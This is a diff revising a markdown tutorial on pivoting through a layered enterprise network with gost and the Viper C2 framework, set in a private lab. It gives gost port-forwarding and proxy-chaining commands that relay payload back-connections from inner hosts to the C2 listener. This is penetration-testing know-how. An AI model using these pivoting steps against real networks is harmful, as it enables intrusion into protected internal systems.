@@ -1,63 +1,57 @@
-# Multi-level intranet penetration (gost&viper)
+# Multi-level Intranet Penetration (gost & viper)
 
-## What is a multi-level intranet
-The multi-level intranet mentioned in the title is common in various large enterprises. For example, the following figure
+## What is a multi-level intranet?
+The multi-level intranet mentioned in the title is common in various large enterprises. For example, as shown in the following figure:
 
-![1630550347634-baccb576-4eec-48a5-bb6a-e84491c56502.webp](./img/zA3VWU0fC_2gXbKF/1630550347634-baccb576-4eec-48a5-bb6a-e84491c56502-926401.webp)
+![](img\multi_level_intranet_penetration_gost_viper\1.webp)
 
-Network A is generally the DMZ area of ​​the enterprise, with external web servers, dns servers, etc.
+In network A, it is generally the DMZ area of the enterprise, which contains external web servers, DNS servers, etc.
 
-The B network is generally the server area of ​​the enterprise intranet, which contains domain control servers, intranet OA, etc.
+In network B, it is generally the server area of the enterprise intranet, including domain control servers, internal network OA, etc.
 
-The C network is generally a red zone of enterprises, with databases for sensitive information storage or various key business servers. (such as hospital HIS, industrial controllers, etc.)
+In network C, it is generally the red area of the enterprise, which contains databases storing sensitive information or various key business servers. (For example, the HIS of a hospital, the industrial controller of an industrial enterprise, etc.)
 
-In this network, Network A can connect to the Internet, Network B can connect to Network A and Network C but cannot connect to the Internet, Network C can only connect to Network B.
+In this kind of network, network A can connect to the Internet, network B can connect to network A and network C but cannot connect to the Internet, and network C can only connect to network B.
 
-
-
-## Viper and gost combine to penetrate multi-level intranet
+## Penetrating multi-level intranets by combining Viper and gost
 The network configuration of the experimental environment is as follows:
 
-![1630551064214-97c362b5-df0b-4020-9137-08009c9e87ba.webp](./img/zA3VWU0fC_2gXbKF/1630551064214-97c362b5-df0b-4020-9137-08009c9e87ba-752405.webp)
+![](img\multi_level_intranet_penetration_gost_viper\2.webp)
 
-+ Online 192.168.146.1
++ Connect to 192.168.146.1
 
-![1633519701641-4158f4eb-b5a7-41ed-9248-ab5b87f6f7f3.webp](./img/zA3VWU0fC_2gXbKF/1633519701641-4158f4eb-b5a7-41ed-9248-ab5b87f6f7f3-609141.webp)
+![](img\multi_level_intranet_penetration_gost_viper\3.webp)
 
-+ Use gost to start a port forwarding on 192.168.146.1, forwarding traffic of 192.168.146.1:2000 to 192.168.146.130:2000
++ Use gost on 192.168.146.1 to start a port forwarding and forward the traffic of 192.168.146.1:2000 to 192.168.146.130:2000
 
 ```plain
 gost.exe -L=tcp://:2000/192.168.146.130:2000
 ```
 
-![1633519969293-8bd71c1e-97c3-4652-9f08-1f6a1d7e0bbc.webp](./img/zA3VWU0fC_2gXbKF/1633519969293-8bd71c1e-97c3-4652-9f08-1f6a1d7e0bbc-535294.webp)
+![](img\multi_level_intranet_penetration_gost_viper\4.webp)
 
-+ 146.11 executes back-connection to payload at 146.1:2000, 146.11 is online (you can see that it is back-connection through 146.1)
++ On 146.11, execute the payload to connect back to 146.1:2000, and 146.11 is online (it can be seen that it is connected back through 146.1)
 
-![1633521049030-5a70991f-60c8-427d-9e2a-3abcd8668377.webp](./img/zA3VWU0fC_2gXbKF/1633521049030-5a70991f-60c8-427d-9e2a-3abcd8668377-203485.webp)
+![](img\multi_level_intranet_penetration_gost_viper\5.webp)
 
-
-
-+ Going online at 146.12 is quite complicated. First, use gost to start a proxy on 146.1:8080
++ Connect to 146.12 is more complicated. First, use gost on 146.1:8080 to start a proxy:
 
 ```plain
 gost.exe -L :8080
 ```
 
-![1633521265187-b601d41b-b54e-4e98-bb70-624c0b608f03.webp](./img/zA3VWU0fC_2gXbKF/1633521265187-b601d41b-b54e-4e98-bb70-624c0b608f03-791533.webp)
+![](img\multi_level_intranet_penetration_gost_viper\6.webp)
 
-+ Then start port forwarding on 146.11, and the traffic passes through the proxy 146.1:8080
++ Then start port forwarding on 146.11. The traffic passes through the proxy of 146.1:8080:
 
 ```plain
 gost.exe -L=tcp://:2000/192.168.146.130:2000 -F 192.168.146.1:8080
 ```
 
-![1633521438835-3074d19b-c71e-4df8-8156-30ef7bff3c29.webp](./img/zA3VWU0fC_2gXbKF/1633521438835-3074d19b-c71e-4df8-8156-30ef7bff3c29-277139.webp)
+![](img\multi_level_intranet_penetration_gost_viper\7.webp)
 
-+ 146.12 executes back-connection to payload at 146.11:2000, 146.12 is online (you can see that 146.12 is back-connection through 146.1)
++ On 146.12, execute the payload to connect back to 146.11:2000, and 146.12 is online (it can be seen that 146.12 is connected back through 146.1)
 
-![1633521514340-eba95781-9291-44f1-b5d5-47709d981332.webp](./img/zA3VWU0fC_2gXbKF/1633521514340-eba95781-9291-44f1-b5d5-47709d981332-116980.webp)
+![](img\multi_level_intranet_penetration_gost_viper\8.webp)
 
-
-
-+ After the payload of 146.12 is connected to port 2000 of 146.11, the gost of 146.11 will add the traffic to the proxy header, and then send it to the proxy 146.1:8080. The proxy header is parsed by the proxy header, and finally send the traffic to 146.130:2000.
++ After the payload of 146.12 connects to the 2000 port of 146.11, the gost of 146.11 will add the proxy header to the traffic and then send it to the proxy of 146.1:8080. The proxy of 146.1:8080 parses the proxy header and finally sends the traffic to 146.130:2000.
